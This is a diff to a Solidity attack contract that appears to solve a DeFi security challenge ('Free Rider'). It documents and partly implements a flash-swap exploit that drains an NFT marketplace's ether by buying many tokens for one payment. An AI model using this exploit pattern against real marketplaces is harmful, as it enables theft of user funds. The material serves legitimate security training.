@@ -141,7 +141,15 @@ interface IWETH {
 // the same nfts!
 //
 // Market starts with 6 nfts costing 15 ether and market has 90 ether
-// Uniswap V2 WETH/DVT pool available
+// Uniswap V2 WETH/DVT pool available. Attack:
+//
+// 1) Use UniswapV2 flash swap to get a flash loan for 31 ether
+//
+// 2) Buy 6 nfts for 15 ether => Market will have 90+15-(6*15) = 15 ether left
+// 
+// 3) Offer 2 nfts for 15 ether each : Market has 15 ether left
+//
+// 4) Buy them both for 15 ether => Market will have 15+15-(2*15) = 0 ether left
 //
 contract FreeRiderNFTMarketplaceAttack is IERC721Receiver {
 
@@ -170,13 +178,13 @@ contract FreeRiderNFTMarketplaceAttack is IERC721Receiver {
         uniswapV2Pair.swap(LOAN_AMOUNT, 0, address(this), hex"00");
     }
 
-        // 2) uniswapv2 flash swap will call this function
+    // uniswapv2 flash swap will call this function
     function uniswapV2Call(address, uint, uint, bytes calldata) external {
         IWETH weth = IWETH(uniswapV2Pair.token0());
 
         weth.withdraw(LOAN_AMOUNT);
 
-        // 3) Buy 6 nfts for 15 ether => Market will have 90+15-(6*15) = 15 ether left
+        // 2) Buy 6 nfts for 15 ether => Market will have 90+15-(6*15) = 15 ether left
         uint256[] memory nftIds = new uint256[](6);
         for(uint8 i=0; i<6;) {
             nftIds[i] = i;
@@ -185,7 +193,7 @@ contract FreeRiderNFTMarketplaceAttack is IERC721Receiver {
 
         market.buyMany{value: 15 ether}(nftIds);
     
-        // 4) Offer 2 nfts for 15 ether each : Market has 15 ether left
+        // 3) Offer 2 nfts for 15 ether each : Market has 15 ether left
         market.token().setApprovalForAll(address(market), true);
         uint256[] memory nftIds2 = new uint256[](2);
         uint256[] memory prices  = new uint256[](2);
@@ -197,7 +205,7 @@ contract FreeRiderNFTMarketplaceAttack is IERC721Receiver {
 
         market.offerMany(nftIds2, prices);
 
-        // 5) Buy them both for 15 ether => Market will have 15+15-(2*15) = 0 ether left
+        // 4) Buy them both for 15 ether => Market will have 15+15-(2*15) = 0 ether left
         market.buyMany{value: 15 ether}(nftIds2);
        
         // forward bought nfts to recovery address to receive eth reward
@@ -210,7 +218,7 @@ contract FreeRiderNFTMarketplaceAttack is IERC721Receiver {
             ++i;
         }
 
-        // 10. Calculate fee and pay back loan.
+        // calculate fee and repay loan.
         uint256 fee = ((LOAN_AMOUNT * 3) / uint256(997)) + 1;
         weth.deposit{value: LOAN_AMOUNT + fee}();
         weth.transfer(address(uniswapV2Pair), LOAN_AMOUNT + fee);
